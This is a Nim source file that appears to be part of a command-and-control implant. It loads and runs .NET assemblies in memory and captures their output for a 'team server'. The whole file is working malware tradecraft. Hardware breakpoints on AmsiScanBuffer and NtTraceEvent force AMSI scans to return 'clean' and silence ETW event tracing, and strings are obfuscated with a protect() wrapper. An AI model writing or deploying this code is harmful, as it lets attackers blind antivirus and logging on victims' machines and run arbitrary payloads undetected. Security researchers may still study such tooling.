import winim/[lean, clr]
import os, strformat, strutils, sequtils
import ./hwbp
import ../../common/[types, utils]

#[ 
    Executing .NET assemblies in memory
    References:
    - https://maldevacademy.com/new/modules/60?view=blocks
    - https://maldevacademy.com/new/modules/61?view=blocks
    - https://github.com/chvancooten/NimPlant/blob/main/client/commands/risky/executeAssembly.nim
    - https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_assembly_loader.nim 
    - https://github.com/hdbreaker/Nimhawk/blob/main/implant/modules/risky/executeAssembly.nim 
]#

#[
    Patching functions
]#
proc amsiPatch(pThreadCtx: PCONTEXT) = 
    # Set the AMSI_RESULT parameter to 0 (AMSI_RESULT_CLEAN)
    SETPARAM_6(pThreadCtx, cast[PULONG](0))
    echo protect("    [+] AMSI_SCAN_RESULT set to AMSI_RESULT_CLEAN")
    CONTINUE_EXECUTION(pThreadCtx)

proc etwPatch(pThreadCtx: PCONTEXT) = 
    pThreadCtx.Rip = cast[PULONG_PTR](pThreadCtx.Rsp)[]
    pThreadCtx.Rsp += sizeof(PVOID)
    pThreadCtx.Rax = STATUS_SUCCESS
    echo protect("    [+] Return value of NtTraceEvent set to STATUS_SUCCESS")
    CONTINUE_EXECUTION(pThreadCtx)

#[
    Dotnet execute-assembly
    Arguments: 
    - assemblyBytes: Serialized .NET assembly 
    - arguments: seq[string] of arguments that should be passed to the function
    Returns: CLR Version and assembly output
]#
proc dotnetInlineExecuteGetOutput*(assemblyBytes: seq[byte], arguments: seq[string] = @[]): tuple[assembly, output: string] = 

    # Patching AMSI and ETW via Hardware Breakpoints
    # Code from: https://github.com/m4ul3r/malware/blob/main/nim/hardware_breakpoints/hardwarebreakpoints.nim
    if not initializeHardwareBPVariables():
        raise newException(CatchableError, protect("Failed to initialize Hardware Breakpoints."))
    defer: uninitializeHardwareBPVariables()

    let amsiScanBuffer = GetProcAddress(LoadLibraryA(protect("amsi.dll")), protect("AmsiScanBuffer"))
    if not setHardwareBreakpoint(amsiScanBuffer, amsiPatch, Dr0):
        raise newException(CatchableError, protect("Failed to install Hardware Breakpoint [AmsiScanBuffer]."))
    defer: discard removeHardwareBreakpoint(Dr0)

    let ntTraceEvent = GetProcAddress(LoadLibraryA(protect("ntdll.dll")), protect("NtTraceEvent"))
    if not setHardwareBreakpoint(ntTraceEvent, etwPatch, Dr1):
        raise newException(CatchableError, protect("Failed to install Hardware Breakpoint [NtTraceEvent]."))
    defer: discard removeHardwareBreakpoint(Dr1)

    # For the actual assembly execution, the winim/[clr] library takes care of most of the heavy lifting for us here
    # - https://github.com/khchen/winim/blob/master/winim/clr.nim
    var mscorlib = load(protect("mscorlib"))

    # Create AppDomain
    let appDomainType = mscorlib.GetType(protect("System.AppDomain"))
    let domainSetup = mscorlib.new(protect("System.AppDomainSetup"))
    domainSetup.ApplicationBase = getCurrentDir() 
    domainSetup.DisallowBindingRedirects = false
    domainSetup.DisallowCodeDownload = true
    domainSetup.ShadowCopyFiles = protect("false")
    
    let domain = @appDomainType.CreateDomain(protect("AppDomain"), toCLRVariant(nil), domainSetup)
    
    # Load assembly     
    let assemblyType = mscorlib.GetType("System.Reflection.Assembly")
    let assembly = @assemblyType.Load(assemblyBytes.toCLRVariant(VT_UI1))

    # Parsing the arguments to be passed to the assembly 
    var args = arguments.toCLRVariant(VT_BSTR)
    
    # Redirect the output of the assembly to a .NET StringWriter so we can return it to the team server over the network
    var 
        Console = mscorlib.GetType(protect("System.Console"))
        StringWriter = mscorlib.GetType(protect("System.IO.StringWriter")) 

    var stringWriter = @StringWriter.new() 
    var oldConsole = @Console.Out
    @Console.SetOut(stringWriter)

    # Execute the entry point of the assembly
    assembly.EntryPoint.Invoke(nil, toCLRVariant([args]))

    # Cleanup
    @Console.SetOut(oldConsole)
    @appDomainType.Unload(domain)

    return (assembly, fromCLRVariant[string](stringWriter.ToString()))